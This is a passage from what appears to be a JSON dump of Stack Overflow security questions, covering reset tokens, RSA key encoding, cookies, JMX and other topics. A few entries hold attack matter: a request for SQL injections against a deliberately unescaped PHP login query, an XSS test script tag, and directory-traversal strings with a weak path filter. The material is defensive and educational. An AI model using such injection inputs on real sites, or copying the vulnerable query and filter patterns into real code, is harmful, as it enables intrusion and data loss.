click before the token times out in an hour. I match their submission with the a challenge token generated server-side. If it matches, then they are forced to choose a new password, and then login.</p>\n\n<p>I would like to know the best way to generate the $site_key. I am thinking of using another HMAC hash that is seeded by random numbers:</p>\n\n<pre><code>$site_key = hash_hmac('sha256', MCRYPT_DEV_RANDOM, MCRYPT_DEV_RANDOM);\n</code></pre>\n\n<p>This produces something like this:</p>\n\n<pre><code>98bb403abbe62f5552f03494126a732c3be69b41401673b08cbfefa46d9e8999\n</code></pre>\n\n<p>Will this be a suitably random to be used for this purpose? Am I overcomplicating this, or approaching it the wrong way?</p>\n\n<p><a href=\"http://stackoverflow.com/questions/401656/secure-hash-and-salt-for-php-passwords/401684#401684\">I was inspired to use HMAC by this answer</a></p>\n\n<p><strong>EDIT:</strong> I am trying to avoid a 'secret question' step urged by some of my coworkers, so I would like the reset link to provide a single step to resetting the password. Therefore, my concern is that this process be secure enough to safeguard a system containing sensitive information.</p>\n\n<p><strong>RESOLVED, for now:</strong> I am going to go with a nonce as described by The Rook as the reset token. Thanks everyone for the comments and feedback.</p>\n"},{"tags":["c#",".net","visual-studio-2010","security"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":208,"score":4,"question_id":12783270,"title":"How to make sure if global keyboard hook have been disconnected?","body":"<p>I have used <a href=\"http://blogs.msdn.com/b/toub/archive/2006/05/03/589423.aspx\" rel=\"nofollow\">Stephen Toubs </a> version of global keyboard hook, using it in a WIN 7 environment.</p>\n\n<p>It works fine for a moment, and then it just stops receiving keystrokes.</p>\n\n<p>I have increased the timeout value in regedit but it still disconnects after some time.</p>\n\n<p>So problem is, how do I detect if it have been disconnected and how do I set the hook to be active again?</p>\n"},{"tags":["php","security"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":69,"score":0,"question_id":12921305,"title":"https inside a page","body":"<p>Hi i have a html page and i want that only login section of page get secure.\nCan i do it ?</p>\n\n<p>Also if https is secure than why not all pages are https ?</p>\n"},{"tags":["java","security","ssh","sftp","theoretical-problem"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12935490,"title":"How to prevent an infinite download?","body":"<p>(By now, this problem is purely theoretical, since we have found a way to avoid it. However, I couldn't solve it at the time it presented itself.)</p>\n\n<p>Using Java, I want to discover and download a file from a single fixed server via SSH FTP at fixed intervals.<br>\nThe remote server, the protocol, the timing and the file are outside my control.\nThe remote server is controlled by a trusted source.</p>\n\n<p>I am currently using Java implementations of <code>ls</code> and <code>get</code> to do download the files.</p>\n\n<p>My client is quite security-conscious, so he wants to prevent as many technical angles of attack as possible.</p>\n\n<p>While thinking about the possibility of a malign entity either impersonating or taking control of the remote server, I noticed that they might replace the usual server with an implementation that replies to <code>ls</code> with an infinite list of files, or replies to <code>get</code> with an infinite stream of bytes.\nAt some point, my memory or harddrive would break and my program crash.</p>\n\n<p>Assuming that I don't know the size a file could take, are there ways to detect and prevent such an attack without stopping legal (but large) downloads?<br>\nI was thinking about checking the number of files/file size beforehand, but even then an attacker could trigger his attack only after I had made such checks.</p>\n"},{"tags":["c#","security","windows-services","localsystem"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":61,"score":1,"question_id":12934999,"title":"Execute task as system?","body":"<p>I'm  trying to test some code that will be running as a service on a remote machine (the service will be running as Local System).</p>\n\n<p>I'm trying to figure out the easiest way on my system to test the code out while it is running underneath the System context.</p>\n\n<p>What would be the easiest way to get the code running underneath the local system account?</p>\n"},{"tags":["ios","security","cryptography","rsa","public-key-encryption"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":63,"score":2,"question_id":12934743,"title":"iOS SecItemCopyMatching RSA public key format?","body":"<p>I'm trying to extract a 1024-bit RSA public key from an already generated key pair (two <code>SecKeyRef</code>s), in order to send it over the wire. All I need is a plain <code>(modulus, exponent)</code> pair, which should take up exactly 131 bytes (128 for the modulus and 3 for the exponent).</p>\n\n<p>However, when I fetch the key info as a <code>NSData</code> object, I get 140 bits instead of 131. Here's an example result:</p>\n\n<pre><code>&lt;30818902 818100d7 514f320d eacf48e1 eb64d8f9 4d212f77 10dd3b48 ba38c5a6\n ed6ba693 35bb97f5 a53163eb b403727b 91c34fc8 cba51239 3ab04f97 dab37736\n 0377cdc3 417f68eb 9e351239 47c1f98f f4274e05 0d5ce1e9 e2071d1b 69a7cac4\n 4e258765 6c249077 dba22ae6 fc55f0cf 834f260a 14ac2e9f 070d17aa 1edd8db1\n 0cd7fd4c c2f0d302 03010001&gt;\n</code></pre>\n\n<p>After retrying the key generation a couple of times and comparing the resulting <code>NSData</code> objects, the bytes that remain the same for all keys are the first 7:</p>\n\n<pre><code>&lt;30818902 818100&gt;\n</code></pre>\n\n<p>The last three bytes look like the exponent (65537, a common value). There are also two bytes between the \"modulus\" and the exponent:</p>\n\n<pre><code>&lt;0203&gt;\n</code></pre>\n\n<p>Can someone with more crypto experience help me identify what encoding is this? DER? How do I properly decode the modulus and exponent?</p>\n\n<p>I tried manually stripping out the modulus and exponent using</p>\n\n<pre><code>NSData* modulus = [keyBits subdataWithRange:(NSRange){ 7, 128 }];\nNSData* exponent = [keyBits subdataWithRange:(NSRange){ 7 + 128 + 2, 3 }];\n</code></pre>\n\n<p>but I get errors when trying to decrypt data which the remote host encoded using that \"key\".</p>\n"},{"tags":["python","security","file-io"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":84,"score":0,"question_id":12932340,"title":"Read only a part of the file that was written using certain function","body":"<p>I have a text file for which I use two write functions: 1) Normal Write, 2) Secure Write.\nBoth the write functions take the data and offset in the file to start writing as parameters.</p>\n\n<p>Now when I want to read the data from the file, I should be only be able to read the data written using the \"Normal Write\" function and should not be able to read the data written using \"Secure Write\" function.</p>\n\n<p>When the user attempts to read the data written using the secure write function, then an exception should be raised. Also if some secure data is sandwiched between non-secure data then only the non-secure contents should be displayed.</p>\n\n<p>Eg: If file contains \"helloHOWareyou\", with'hello' and 'areyou' written using normal write and 'HOW' is written using secure write,then only 'hello' and 'are you' should be read.</p>\n\n<p>I tried this holding the offsets and the length of the secure data in a file header and comparing this with the offset passed to the read function.</p>\n\n<pre><code>#Normal Write \ndef writeat(self,data,offset): \n    self.file.writeat(data,offset)\n\n#Secure Write \ndef securewrite(self,data,offset):\n    #Global dict to store the offset and length of secure data\n    #Have to use this since it is a spec\n    myvar['offset']=(offset,offset+len(data)) \n    self.file.writeat(data,offset)\n\n#Read function\ndef readata(self,bytes,offset):\nsecureRange=mycontext['offset']\nif offset in range(secureRange[0],secureRange[1]):\n       raise ValueError\nelse:\n       return self.file.readat(bytes,offset)\n</code></pre>\n\n<p>Test Program:</p>\n\n<pre><code>myfile=openfile(\"sample.txt\",a)  #Open a file\n\n#Write some data to file\nmyfile.writeat(\"abcd\",0)\n\n#Write private data to file\nmyfile.securewrite(\"efgh\",4)\n\n# This read is in the region written by writeat and should not be blocked...\nx=myfile.readat(4,0)\nprint x\n\ntry:\n  #Try to read the secure data from the file\n  y=myfile.readat(4,4)\n  print y\n\nexcept ValueError:\n    print (\"Value Error Handled\")\n    pass\n\nelse:\n  print (\"Secure data compromised!\")    \n\nfinally:\n  #Close the file\n  myfile.close()`\n</code></pre>\n\n<p>Had some success with it but of little help.</p>\n"},{"tags":["php","regex","security"],"answer_count":3,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":12932426,"title":"Is it a good idea to let users query by regex?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/2371445/sanitization-of-user-supplied-regular-expressions-in-php\">Sanitization of User-Supplied Regular Expressions in PHP</a>  </p>\n</blockquote>\n\n\n\n<p>Let's say you want to let users search for something and your search function has the ability to accept regular expressions.</p>\n\n<p>Is it OK to let site users to search by regexes that they post? From a user's point of view, I'd love a site which would let me do that :D</p>\n\n<p>Is there any security risk involved? How can I sanitize a regex?</p>\n"},{"tags":["android","security","android-webview"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":34,"score":1,"question_id":12932735,"title":"How can I prevent an Android WebView from manipulating a web page?","body":"<p>As shown <a href=\"http://stackoverflow.com/questions/2219074/in-android-webview-am-i-able-to-modify-a-webpages-dom\">here</a> it is possible to:\n1. Create an Android WebView with setJavaScriptEnabled=true\n2. Load a URL\n3. Override onPageFinished and change the Web page displayed to the user</p>\n\n<p>Now, is it possible for the Web page owner to implement anything server-side which prevents this from happening? The risk is that a malicious app could spoof the user by amending the Web page for nefarious means...</p>\n\n<p>Many thanks!</p>\n"},{"tags":["java","security","email"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":44,"score":-2,"question_id":12928879,"title":"How to send an email with password details in JSF","body":"<p>Suppose a user forgot his password and he wants to know his password. He has to provide an answer for his security question. After providing the correct answer, I want to send an email with password details to the user's email address.</p>\n\n<p>So, what mail configurations should I do in jsf so that it interacts with many email addresses of respective users?</p>\n"},{"tags":["java","spring","security","jmx"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":62,"score":1,"question_id":12929335,"title":"Java JMX get the logged in user","body":"<p>I have a JMX server started by JVM process that can be optionally secured (for now its not, so I'm ready to consider any extensible way for it). For example as an option I looked at <a href=\"http://docs.oracle.com/javase/6/docs/technotes/guides/management/agent.html\" rel=\"nofollow\">official tutorial</a> and its ok for now to use user/password authentication.\nThe MBeans are deployed via spring (annotations approach is used).</p>\n\n<p>Now I would like to get <strong>from within</strong> my MBean the user name for some additional actions. Is it possible to do in JMX technology at all? If Yes how? :)</p>\n\n<p>Example:</p>\n\n<pre><code>public class MyMBean {\n\n    public void myOp() {\n\n        String userName = ... ?;  // or whatever object that can bring me the name\n\n        makeSomethingWithUserName ( userName );\n\n        doMyStuffHere();\n    }\n}\n</code></pre>\n\n<p>I've found <a href=\"http://www.java.net/node/680707\" rel=\"nofollow\">this tutorial</a> but it seems to be glassfish specific and I'm looking for plain java based solution.</p>\n\n<p>Thanks a lot and have a nice day</p>\n"},{"tags":["c#",".net","security","encryption"],"answer_count":2,"favorite_count":1,"up_vote_count":17,"down_vote_count":0,"view_count":6486,"score":17,"question_id":818704,"title":"How to convert SecureString to System.String?","body":"<p>All reservations about unsecuring your SecureString by creating a System.String out of it <strong>aside</strong>, how can it be done?</p>\n\n<p>How can I convert an ordinary System.Security.SecureString to System.String?</p>\n\n<p>I'm sure many of you who are familiar with SecureString are going to respond that one should never transform a SecureString to an ordinary .NET string because it removes all security protections.  <strong>I know</strong>.  But right now my program does everything with ordinary strings anyway, and I'm trying to enhance its security and although I'm going to be using an API that returns a SecureString to me I am <em>not</em> trying to use that to increase my security.  </p>\n\n<p>I'm aware of Marshal.SecureStringToBSTR, but I don't know how to take that BSTR and make a System.String out of it.</p>\n\n<p>For those who may demand to know why I would ever want to do this, well, I'm taking a password from a user and submitting it as an html form POST to log the user into a web site.  So... this really has to be done with managed, unencrypted buffers.  If I could even get access to the unmanaged, unencrypted buffer I imagine I could do byte-by-byte stream writing on the network stream and hope that that keeps the password secure the whole way.  I'm hoping for an answer to at least one of these scenarios.</p>\n\n<p>Thanks!</p>\n"},{"tags":["xml","security","authentication","protect"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":27,"score":1,"question_id":12926176,"title":"How can I secure or authenticate access to XML files?","body":"<p>I have a XML file that saves EMail template information, and one thing contained therein is user emails. Is there a way to ensure that only logged in users can access this file? For instance, I would like to do something like this for a PHP page:</p>\n\n<pre><code>require(\"checklogin.php\")\n</code></pre>\n"},{"tags":["mysql","security","injection"],"answer_count":6,"favorite_count":2,"up_vote_count":5,"down_vote_count":0,"view_count":2268,"score":5,"question_id":1508431,"title":"How to demonstrate SQL Injection in this PHP and MySQL code?","body":"<p>I'd like to note first that this is an education attempt on my own database to better understand MySQL injections to protect my own code.</p>\n\n<p>I need to work out a couple of examples of how a MySQL injection can be constructed against the following code. It's a basic user login system where I'm accepting the username and password without any escaping </p>\n\n<pre><code>$user = (!empty($_POST['user'])) ? $_POST['user'] : '';\n$pass = (!empty($_POST['pass'])) ? $_POST['pass'] : '';\n</code></pre>\n\n<p>The MySQL query then tries to find the entered username and password in my table called users, as follows: </p>\n\n<pre><code>$res = mysql_query(\"SELECT * from users where user='{$user}' AND pass='{$pass}'\");\n</code></pre>\n\n<p>This is un-escaped input, and I'm trying to come up with MySQL injections to:</p>\n\n<ol>\n<li>bypass the password knowing a legitimate user's username (one user in my users table is tester), and</li>\n<li>an injection that would drop the <a href=\"http://xkcd.com/327\" rel=\"nofollow\">users</a> table in its entirety. </li>\n</ol>\n\n<p>I've tried a couple of MySQL injection examples from <a href=\"http://en.wikipedia.org/wiki/SQL_injection\" rel=\"nofollow\">Wikipedia</a>, but I'm guessing the <code>{}</code> in my query is preventing the injection, so I would appreciate some help from those who are confident with this, and thank you to all.</p>\n"},{"tags":["javascript","android","security","sharedpreferences"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12927570,"title":"Can I read sharedpreference from Javascript in android?","body":"<p>In my Android application, if I download some <code>JavaScript</code> from a web URI, can that JavaScript read my native files like shared preferences or other files which I stored in my application's location?</p>\n\n<p>Any ideas?</p>\n"},{"tags":["security","web-security"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":12927733,"title":"Is verisign VIP(Validation & ID Protection) Access Desktop safe enough?","body":"<p>I saw this software on verisign homepage:\n<a href=\"https://idprotect.verisign.com/desktop/home.v\" rel=\"nofollow\">https://idprotect.verisign.com/desktop/home.v</a></p>\n\n<p>Unlike many hardware one time password products,\nit creates the one time password on PC,\nthat password might leak on virus attacks.</p>\n\n<p>BTW, verisign sells hardware one time password product too:\n<a href=\"https://idprotect.verisign.com/tokencatalogkeychain.v\" rel=\"nofollow\">https://idprotect.verisign.com/tokencatalogkeychain.v</a>),</p>\n"},{"tags":["javascript","html","security","xss"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":77,"score":3,"question_id":12926997,"title":"How to temporarily disable XSS protection in modern browsers for testing?","body":"<p>Is it possible to temporarily disable the XSS protection found in modern browsers for testing purposes?</p>\n\n<p>I'm trying to explain to a co-worker what happens when one sends this to an XSS-vulnerable web form:</p>\n\n<pre><code>&lt;script&gt;alert(\"Danger\");&lt;/script&gt;\n</code></pre>\n\n<p>However, it appears that both Chrome and Firefox are preventing the XSS popup. Can I disable this protection so I can fully see the results of my actions?</p>\n"},{"tags":["security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":5,"view_count":50,"score":-5,"question_id":12927127,"title":"Does this replaceAll \"sanitize\" a path?","body":"<p>Written in Java.\nI dont understand why this would be a security issue\nif fName = ..project/blah/blah.exe</p>\n\n<p>would this possibly open a file that might be malicious on a different directory that has the same name?</p>\n\n<pre><code>String sFileName = request.getParameter(“fName”);\nsFileName = sFileName.replaceAll(\"/\", “\\\\\");\nsFileName = sFileName.replaceAll(“..\\\\\", \"\"); \n</code></pre>\n"},{"tags":["flash","security","flash-cs4","sandbox","violation"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":3108,"score":0,"question_id":2544568,"title":"Flash CS4 AS3 Security Sandbox Violation","body":"<p>I have build my entire website with flash and embedded several swf objects (slideshows) into it. everything always worked fine when I published it as swf movie.\nbut now that I want to upload my website an error message occurs saying:</p>\n\n<pre><code>Error #2044: Unhandled SecurityErrorEvent:. text=Error #2140: Security sandbox violation: file:///mylayout.swf cannot load file:///slideshow_1.swf. Local-with-filesystem and local-with-networking SWF files cannot load each other.\n</code></pre>\n\n<p>I know that it has something to do with the fact that one of the swf is local with filesystem and the other local with networking. but in my publish settings i told it to access local files only. but it didnt help.</p>\n\n<p>does anyone have an answer?</p>\n\n<hr>\n\n<p>sorry for being such a newbie in doing a flash website. \nbut i dont really know what your are talking about. \ni am hosting my website at www.all-inkl.com. \nbesides that i have not uploaded it yet. i am just testing it offline. \nand the code </p>\n\n<pre><code>&lt;allow-access-from domain=\"localhost\" secure=\"true\"/&gt;`\n</code></pre>\n\n<p>where should i add it, to my timeline?</p>\n\n<p>thank you for your help.</p>\n"},{"tags":["php","security","directory-traversal"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1534,"score":1,"question_id":4205141,"title":"Preventing Directory Traversal in PHP but allowing paths","body":"<p>I have a base path /whatever/foo/</p>\n\n<p>and\n$_GET['path'] should be relative to it.</p>\n\n<p>However how do I accomplish this (reading the directory), without allowing directory traversal?</p>\n\n<p>eg.</p>\n\n<p>/..|../</p>\n\n<p>Will not filter properly.</p>\n"},{"tags":["python","security","webserver","messaging","rabbitmq"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":120,"score":1,"question_id":11954580,"title":"RabbitMQ - Game Rooms and Security Considerations","body":"<p>I'm programming an Android application and want to define rooms. The rooms would hold all the users of certain game. This is like poker with 4 players, where each room can hold 4 users. I also want to use rabbitmq for scalability and customobility. The problem is that the Android application uses the same username:password to connect all users to a RabbitMQ server (specific virtual host). </p>\n\n<p>I guess I'm worried that one user might be able to read/write messages from different queues that it should. There are multiple solutions that are not satisfactory:</p>\n\n<ol>\n<li><p>Use a different user in each Android application: This really can't be done, because the Android Market doesn't allow different applications for each user that downloads it. Even if it did, it's a stupid idea anyway.</p></li>\n<li><p>Set appropriate access controls: <a href=\"http://www.rabbitmq.com/access-control.html\" rel=\"nofollow\">http://www.rabbitmq.com/access-control.html</a> . I guess  this wouldn't prevent the problem of a malicious attacker reading/writing messages from/to queues it doesn't have access to.</p></li>\n<li><p>Set appropriate routing keys: I guess if each user creates another queue from which it can read messages and published messages to specifically defined queue, this can work. But I guess the problem is the same, since users will be connecting to the RabbitMQ with the same username:password: therefore this user can read all queues and write to them (based on the access rules).</p></li>\n</ol>\n\n<p>My question is: how to allow an attacker from reading/writing to queues that represent only the rooms he's currently joined in, and preventing access to other queues?</p>\n"},{"tags":["osx","security","service","restart"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":12925259,"title":"restarting Mac OS securityd","body":"<p>Currently, MacOS has a bug where upon unlocking a Smartcard in Keychain.app will result in the padlock icon within system preferences to become frozen.  You can no longer \"click to unlock\" the padlock to elevate to admin privileges within system preferences.  </p>\n\n<p>Internally, we have found that restarting <code>securityd</code> solves the \"frozen\" padlock, but with this restart comes lots of problems for the OS X.</p>\n\n<p>Here is what we are talking about becoming frozen (see red circle):</p>\n\n<p><img src=\"http://i.stack.imgur.com/o8r8n.jpg\" alt=\"padlock icon\"></p>\n\n<p>Here is how we stopped and started securityd.</p>\n\n<pre><code>sudo launchctl unload -w /System/Library/LaunchDaemons/com.apple.securityd.plist\nsudo launchctl load -w /System/Library/LaunchDaemons/com.apple.securityd.plist\n</code></pre>\n\n<p>When this was completed, the padlock become functional again.  However, we found the following problems after restart:</p>\n\n<ol>\n<li>The user can no longer wake from screensaver - the username/password\ndialogue will not appear for any wake event, keyboard or mouse move,\nresulting in a machine that will require a restart or force to login\nwindow</li>\n<li>You cannot unmount any shares or CD's/DVD's - any mounted shares\nwill no longer unmount    as a result of this securityd restart</li>\n<li>Some other minor issues were reported (which I did not experience),\nyou can read them here in this Apple Community Thread:</li>\n</ol>\n\n<blockquote>\n  <p><a href=\"https://discussions.apple.com/thread/3248969?start=60&amp;tstart=5\" rel=\"nofollow\">https://discussions.apple.com/thread/3248969?start=60&amp;tstart=5</a></p>\n</blockquote>\n\n<p>It seems entirely possible that Apple would not like the restarting of securityd to take place, however, we have found that this is the only solution that works for resetting the padlock to a functional state.  We have tried restarting <code>pcdcd</code> and that did not help and other tricks in lieu of restarting <code>securityd</code>.</p>\n\n<p>We are looking for a <strong>safe restart process</strong> for <code>securityd</code>.</p>\n"},{"tags":["php","security","webserver"],"answer_count":6,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":68,"score":0,"question_id":12923638,"title":"put a index.php (or .html) file on every folder of a site, is a good security practice?","body":"<p>I've heard this many and many times: \"create a index.php on every folder in your web server to make sure users will not see a list of files in the folders\"</p>\n\n<p>is that true? I'm in need of some good pratices for security.</p>\n"},{"tags":["forms","security","cakephp","plugins"],"answer_count":0,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":73,"score":4,"question_id":12922111,"title":"CakePHP 2.x: Embedding a login form as an element using CakeDC's User plugin and Security component","body":"<p>newish CakePHP user here. I haven't been able to find a solution to this issue.</p>\n\n<p>I would like to embed a login form as an element in an existing page. I am using the CakeDC user plugin. The goal is to embed the login form in the page and then, when they log in, update some content on the page without refreshing the page. Before we get to worrying about AJAX and SecurityComponent, I would like to at least get the form embedded on some other page as an element.</p>\n\n<p>For starters, I tried to straight up copy and paste the contents of '/Views/Users/login.ctp' into the element. This gave me an warning of 'undefined variable \"$Model\"', so I hardcoded the model as 'Users.User\" (because I assumed that the notation for accessing a model inside a plugin was 'plugin.model' like they said in the manual). This failed with the error message Error: <em>Users.usersController could not be found.</em></p>\n\n<p>So, I adjusted the form to take 'User' as the model instead of $model and the request now gets blackholed. If I disable the security component, I can log in successfully. This isn't quite a satisfactory solution (I mean, I could opt to not validate the form or define 'login' as an unlocked action, but if I do that, then I may as well not have security enabled for login, right?).</p>\n\n<p>Here is the code for app/Plugin/Users/View/Elements/login.ctp:</p>\n\n<pre><code>&lt;div class=\"users index\"&gt;\n&lt;h2&gt;&lt;?php echo __d('users', 'Login'); ?&gt;&lt;/h2&gt;\n&lt;fieldset&gt;\n    &lt;?php\n        echo $this-&gt;Form-&gt;create('User', array(\n            'action' =&gt; 'login',\n            'id' =&gt; 'LoginForm'));\n        echo $this-&gt;Form-&gt;input('User.email', array(\n            'label' =&gt; __d('users', 'Email')));\n        echo $this-&gt;Form-&gt;input('User.password',  array(\n            'label' =&gt; __d('users', 'Password')));\n\n        echo '&lt;p&gt;' . __d('users', 'Remember Me') . $this-&gt;Form-&gt;checkbox('remember_me') . '&lt;/p&gt;';\n        echo '&lt;p&gt;' . $this-&gt;Html-&gt;link(__d('users', 'I forgot my password'), array('action' =&gt; 'reset_password')) . '&lt;/p&gt;';\n\n        echo $this-&gt;Form-&gt;end(__d('users', 'Submit'));\n    ?&gt;\n&lt;/fieldset&gt;\n</code></pre>\n\n<p></p>\n\n<p>Following is the code for the View that is calling the element:</p>\n\n<pre><code>&lt;div id=\"loginform\"&gt;\n&lt;?php echo $this-&gt;element('Users.login'); ?&gt;\n&lt;/div&gt;\n</code></pre>\n\n<p>If I copy and paste the element code into a View (say, in <code>apps/Plugin/Users/View/Users/login.ctp</code>), it works regardless of whether Security is on or off, so I suspect some monkeying around with the form or Security calls is in order.</p>\n\n<p>Any ideas or help would be greatly appreciated.</p>\n"},{"tags":["php","security"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":40,"score":1,"question_id":12920874,"title":"secure php settings","body":"<p>i guess php.ini is a very important file in regards of security.</p>\n\n<p>Few points i know which we should do for security points are </p>\n\n<ol>\n<li>REGISTER GLOBAL SHOULD BE OFF</li>\n<li>allow_url_fopen = Off</li>\n</ol>\n\n<p>can someone share more points here ?</p>\n"},{"tags":["security","http","web-applications","cookies"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12919747,"title":"Which cookie attributes uniquely identify a cookie?","body":"<p>I'm trying to determine scenarios in which a cookie returned by HTTP server overwrites an existing cookie vs. sets a new cookie.</p>\n\n<p>Say foo.example.com sets a cookie:</p>\n\n<blockquote>\n  <p>Set-Cookie: SSID=abc; Domain=.example.com; Path=/abc; Expires=Wed,\n  13-Jan-2021 22:23:01 GMT; Secure; HttpOnly</p>\n</blockquote>\n\n<p>Which attributes bar.example.com needs to set in order to overwrite this cookie and not create a new one? In particular, will following response header overwrite the original cookie:</p>\n\n<blockquote>\n  <p>Set-Cookie: SSID=xyz; Domain=.example.com; Expires=Wed, 13-Jan-1990\n  22:23:01 GMT;</p>\n</blockquote>\n\n<p>Is the behavior consistent across browsers?</p>\n"},{"tags":[".net","security","encryption","hash"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":67,"score":4,"question_id":12916612,"title":"Why is SHA512Managed not FIPS Compliant?","body":"<p>As the title asks, why does SHA512Managed encryption cause an <code>InvalidOperationException</code> when the FipsAlgorithmPolicy is active on a machine?</p>\n\n<p>Is it not secure enough for the FIP standard, or is it too secure?</p>\n"},{"tags":["java","security","web-applications","jetty","openldap"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":87,"score":0,"question_id":12873237,"title":"Jetty LdapLoginModule: Login Failure: all modules ignored","body":"<p>I'm getting the below on trying to submit a login form. Does anyone know what causes this? Thanks.</p>\n\n<pre><code>2012-10-13 13:11:46.300:INFO:oejpjs.LdapLoginModule:Searching for users with filter: '(&amp;(objectClass={0})({1}={2}))' from base dn: ou=people,dc=my-domain,dc=com\n2012-10-13 13:11:46.307:INFO:oejpjs.LdapLoginModule:Found user?: true\n2012-10-13 13:11:46.311:WARN:oejpj.JAASLoginService:\njavax.security.auth.login.LoginException: Login Failure: all modules ignored\nat javax.security.auth.login.LoginContext.invoke(LoginContext.java:921)\nat javax.security.auth.login.LoginContext.access$000(LoginContext.java:186)\nat javax.security.auth.login.LoginContext$4.run(LoginContext.java:683)\nat java.security.AccessController.doPrivileged(Native Method)\nat javax.security.auth.login.LoginContext.invokePriv(LoginContext.java:680)\nat javax.security.auth.login.LoginContext.login(LoginContext.java:579)\nat org.eclipse.jetty.plus.jaas.JAASLoginService.login(JAASLoginService.java:238)\nat org.eclipse.jetty.security.authentication.FormAuthenticator.validateRequest(FormAuthenticator.java:209)\nat org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:491)\nat org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:231)\nat org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1072)\nat org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:382)\nat org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:193)\nat org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:1006)\nat org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:135)\nat org.eclipse.jetty.server.handler.ContextHandlerCollection.handle(ContextHandlerCollection.java:255)\nat org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:154)\nat org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:116)\nat org.eclipse.jetty.server.Server.handle(Server.java:365)\nat org.eclipse.jetty.server.AbstractHttpConnection.handleRequest(AbstractHttpConnection.java:485)\nat org.eclipse.jetty.server.AbstractHttpConnection.content(AbstractHttpConnection.java:937)\nat org.eclipse.jetty.server.AbstractHttpConnection$RequestHandler.content(AbstractHttpConnection.java:998)\nat org.eclipse.jetty.http.HttpParser.parseNext(HttpParser.java:856)\nat org.eclipse.jetty.http.HttpParser.parseAvailable(HttpParser.java:240)\nat org.eclipse.jetty.server.AsyncHttpConnection.handle(AsyncHttpConnection.java:82)\nat org.eclipse.jetty.io.nio.SelectChannelEndPoint.handle(SelectChannelEndPoint.java:627)\nat org.eclipse.jetty.io.nio.SelectChannelEndPoint$1.run(SelectChannelEndPoint.java:51)\nat org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:608)\nat org.eclipse.jetty.util.thread.QueuedThreadPool$3.run(QueuedThreadPool.java:543)\nat java.lang.Thread.run(Thread.java:680)\n</code></pre>\n\n<p>FWIW this is some of the peripheral configuration:</p>\n\n<p>jetty.xml:</p>\n\n<pre><code>&lt;?xml version=\"1.0\"?&gt;\n&lt;Configure&gt;\n    &lt;Call name=\"addBean\"&gt;\n        &lt;Arg&gt;\n            &lt;New class=\"org.eclipse.jetty.plus.jaas.JAASLoginService\"&gt;\n                &lt;Set name=\"name\"&gt;ldap&lt;/Set&gt;\n                &lt;Set name=\"loginModuleName\"&gt;ldaploginmodule&lt;/Set&gt;\n            &lt;/New&gt;\n        &lt;/Arg&gt;\n    &lt;/Call&gt;\n&lt;/Configure&gt;\n</code></pre>\n\n<p>ldap.conf:</p>\n\n<pre><code>ldaploginmodule {\n    org.eclipse.jetty.plus.jaas.spi.LdapLoginModule required\n    debug=\"true\"\n    contextFactory=\"com.sun.jndi.ldap.LdapCtxFactory\"\n    hostname=\"localhost\"\n    port=\"389\"\n    bindDn=\"cn=Manager,dc=my-domain,dc=com\"\n    bindPassword=\"secret\"\n    authenticationMethod=\"simple\"\n    forceBindingLogin=\"false\"\n    userBaseDn=\"ou=people,dc=my-domain,dc=com\"\n    userRdnAttribute=\"uid\"\n    userIdAttribute=\"uid\"\n    userPasswordAttribute=\"userPassword\"\n    userObjectClass=\"inetOrgPerson\"\n    roleBaseDn=\"ou=groups,dc=my-domain,dc=com\"\n    roleNameAttribute=\"cn\"\n    roleMemberAttribute=\"uniqueMember\"\n    roleObjectClass=\"groupOfUniqueNames\";\n};\n</code></pre>\n"},{"tags":["php","javascript","security","https","xss"],"answer_count":4,"favorite_count":3,"up_vote_count":6,"down_vote_count":0,"view_count":702,"score":6,"question_id":6530339,"title":"Does https secure cookies prevent XSS attacks?","body":"<p>Does https connection secure cookies and prevents XSS attacks. I have a simple blog that allows users to enter JavaScript code as an input. I want to allow Javascript input by the user while still preventing XSS attacks and cookie stealing. Does https help secure 